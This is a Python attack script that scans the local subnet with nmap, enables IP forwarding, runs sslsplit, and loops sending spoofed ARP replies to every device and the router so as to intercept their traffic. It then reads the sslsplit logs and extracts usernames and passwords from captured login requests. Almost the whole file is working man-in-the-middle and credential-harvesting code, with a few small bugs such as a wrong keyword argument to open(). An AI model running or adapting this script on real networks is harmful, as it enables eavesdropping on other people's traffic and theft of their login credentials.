import struct
import os
import subprocess
import socket
import re
import fcntl
from scapy.all import *
from time import *
from util import *

if __name__ == "__main__":

    # init iptables to get clean iptables
    iptables_init()
    
    ip          = getHostIp()
    nic         = getNic()
    hostip      = ip 
    hostmac     = getMac(nic)
    routerIp    = get_default_gateway_linux()
    routerMac   = ""

    # ip and MAC address of command "ip addr"
    # search Ip with subnet mask by using ip we already know
    # example:
    #   nicip: 192.168.1.1/24, 192.168.1.2/24, etc
    #   ip : 192.168.1.1
    nicip = nicInfo()
    for i in nicip:
        # print(ip, " ", i.split("/")[0])
        if(i.split("/")[0]==ip):
            ip = i
            break
    
    # execute "nmap" 
    result = nmap(ip)
    # print(result)

    # we can get all ip and mac address of all device which in same subnet from the result of nmap
    # regular expression for IPv4, get the list of all device's ip address
    ip = re.findall("\d+\.\d+\.\d+\.\d+", result)
    # regular expression for MAC, get the list of all device's mac address
    mac = re.findall(
        "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", result)

    # since we neither need to show Host's ip and mac address nor Router's ip and mac
    # remove them from ip and mac list
    for i in ip:
        if(i == hostip):
            ip.remove(i)
            break

    _len = len(ip)
    for i in range(0, _len):
        if(ip[i] == routerIp):
            routerMac = mac[i]
            ip.remove(ip[i])
            mac.remove(mac[i])
            break
    
    # show all device's ip and mac address for debug
    # print("")

    # print("nic card: ", nic)
    # print("router Ip: %-18s MAC: %s" % (routerIp,routerMac))
    # print("host   Ip: %-18s MAC: %s" % (hostip, hostmac))

    # print("")

    print("----------------------------------------------")
    print("IP                       MAC")
    print("----------------------------------------------")    

    for i in range(0,len(ip)):
        print("%-18s       %s" % (ip[i],mac[i]))

    # enable ip forwarding of Linux device
    enable_port_forwarding()

    # execute sslplit 
    sslsplit()

    sending_flag = True
    try:
        while(1):
            # send arp relies spoofing
            print(" ")
            for j in range(0,len(ip)):
                if(ip[j].split(".")[3] != "3" and ip[j].split(".")[3] != "254"):
                    victimpacket = ARP( op      =  2,
                                        pdst    = ip[j],            # victim's IP
                                        hwdst   = mac[j],           # victim's MAC 
                                        psrc    = routerIp,         # router's IP
                                        hwsrc   =  hostmac)         # attacker's MAC
                    routerpacket = ARP( op      =   2,
                                        pdst    =   routerIp,       # router's IP
                                        hwdst   =   routerMac,      # router's MAC
                                        psrc    =   ip[j],          # victim's IP
                                        hwsrc   =   hostmac)        # attacker's MAC

                    # verbose=0 : make the function totally silent
                    # More : help(send)
                    # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
                    send(victimpacket, verbose=0)
                    send(routerpacket, verbose=0)
                    if(sending_flag):
                        print("Send to: ",ip[j]," ",mac[j])

            # get all username and password in log file
            print(" ")
            for file in os.listdir("logdir/"):
                with open("logdir/" + file, 'r', decoding='utf-8', errors='ignore') as f:
                    for line in f:
                        if ("username=" in line) and ("password=" in line):
                            print(type(line), line)
                            (username, passwd) = re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other", line)[0]
                            print("username: ", username.encode, " password: ",  passwd)
            sending_flag = False
            sleep(1)
    finally:
        print("Done")
